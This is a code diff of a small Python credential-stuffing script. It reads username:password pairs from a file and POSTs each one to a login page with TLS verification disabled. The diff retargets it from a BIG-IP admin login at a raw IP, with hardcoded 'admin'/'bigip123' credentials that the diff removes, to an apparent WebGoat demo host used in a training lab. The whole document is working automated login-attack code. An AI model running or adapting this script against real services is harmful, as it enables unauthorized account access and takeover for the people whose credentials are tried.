@@ -3,15 +3,13 @@ requests.packages.urllib3.disable_warnings()
 
 #Globals, 
 #Configurable globals, should be configured to match your environment
-adminUser = 'admin'
-adminPass = 'bigip123'
-host = 'https://29.4.6.19'
-loginUri = '/tmui/logmein.html'
+host = 'https://insecureapp1.f5.demo'
+loginUri = '/WebGoat/login'
 hostUrl = host + loginUri
 credRegex = '(?P<username>.*):(?P<password>.*)'
+
+
 #End configurable globals
-
-
 
 #Require Python v3 or greater
 if sys.version_info[:3] < (3,0,0):
@@ -30,16 +28,19 @@ else:
     sys.exit()
 ##
 
-
 for line in fileinput.input([credFile]):
 
 	matchCreds = re.match(credRegex,line)
 
 	if matchCreds:
 		
-		#print(matchCreds.group('username'))
-		#print(matchCreds.group('password'))
-		dataCreds = '{\'username\':\'' + matchCreds.group('username') + '\',\'passwd\':\'' + matchCreds.group('password') + '\'}'
-		print(dataCreds)
+		#dataCreds = '{\'username\':\'' + matchCreds.group('username')  + '\',\'password\':\'' + matchCreds.group('password') + '\'}'
+		dataCreds = {}
+		dataCreds['username'] = matchCreds.group('username')
+		dataCreds['password'] = matchCreds.group('password')
 		response = requests.post(hostUrl,data=dataCreds,verify=False)
 		print(response.text)
+		
+		
+
+
